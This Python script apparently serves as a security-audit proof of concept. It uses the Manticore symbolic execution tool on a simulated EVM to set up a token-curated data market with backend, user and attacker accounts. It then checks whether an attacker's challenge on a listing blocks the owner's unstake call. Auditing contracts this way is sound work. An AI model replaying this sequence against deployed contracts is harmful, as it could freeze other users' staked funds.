from manticore.ethereum import ManticoreEVM
from manticore.utils import config
#from manticore.core.smtlib.expression import BoolAnd, BoolNot
from manticore.ethereum.abi import ABI

from initialize_market import initialize, DEFAULT_PARAMETERS
from constants import ONE_ETH, ONE_GWEI
from utils import increase_timestamp

consts = config.get_group("evm")
consts.oog = "ignore"

################ Script #######################

m = ManticoreEVM()

market_parameters = DEFAULT_PARAMETERS

market_parameters['vote_by_d'] = 1
market_parameters['pl'] = 1
market_parameters['stk'] = 1

market = initialize(m, parameters=market_parameters)

backend_balance = 100 * ONE_ETH
backend_account = m.create_account(balance=backend_balance)
print("[+] Creating a backend account", hex(backend_account.address))

market.ether_token_contract.deposit(value=backend_balance, caller=backend_account)

market.ether_token_contract.approve(market.reserve_contract, backend_balance, caller=backend_account) 
market.market_token_contract.approve(market.voting_contract, backend_balance, caller=backend_account) 

market.reserve_contract.support(100*ONE_GWEI, caller=backend_account)

backend_url = "my_backend_url"
backend_url_hash = bytes.fromhex("59cda2aae91169ada6b8881e546e9c97187a2e6506d09d17e1fc8c3697e89eca")

market.datatrust_contract.register(backend_url, caller=backend_account)
market.voting_contract.vote(backend_url_hash, 1, caller=backend_account)

increase_timestamp(m, 32)

market.datatrust_contract.resolveRegistration(backend_url_hash, caller=backend_account)
market.datatrust_contract.getBackendAddress()

# user (market.ether_token_owner)
print("[+] Setting up a user account")

market.ether_token_contract.approve(market.reserve_contract, market.ether_token_owner, caller=market.ether_token_owner) 
market.market_token_contract.approve(market.voting_contract, market.ether_token_owner, caller=market.ether_token_owner) 

market.reserve_contract.support(100*ONE_GWEI, caller=market.ether_token_owner)

user_list_hash = "my_list_hash"
market.listing_contract.list(user_list_hash, caller=market.ether_token_owner)
market.voting_contract.vote(user_list_hash, 1, caller=market.ether_token_owner)

increase_timestamp(m, 32)

market.datatrust_contract.setDataHash(user_list_hash, backend_url_hash, caller=backend_account)

attacker_balance = 100 * ONE_ETH
attacker_account = m.create_account(balance=attacker_balance)
print("[+] Creating a attacker account", hex(attacker_account.address))

market.ether_token_contract.deposit(value=attacker_balance, caller=attacker_account)
market.ether_token_contract.approve(market.reserve_contract, attacker_balance, caller=attacker_account) 
market.market_token_contract.approve(market.voting_contract, attacker_balance, caller=attacker_account) 

#value = m.make_symbolic_value(name="attacker_to_buy")
market.reserve_contract.support(100*ONE_GWEI, caller=attacker_account)

market.listing_contract.resolveApplication(user_list_hash, caller=market.ether_token_owner)
market.listing_contract.challenge(user_list_hash, caller=attacker_account)

market.voting_contract.unstake(user_list_hash, caller=market.ether_token_owner)

if (list(m.ready_states) == []):
  print("Unstake was blocked by an attacker")

m.finalize()
print(f"[+] Look for results in {m.workspace}")
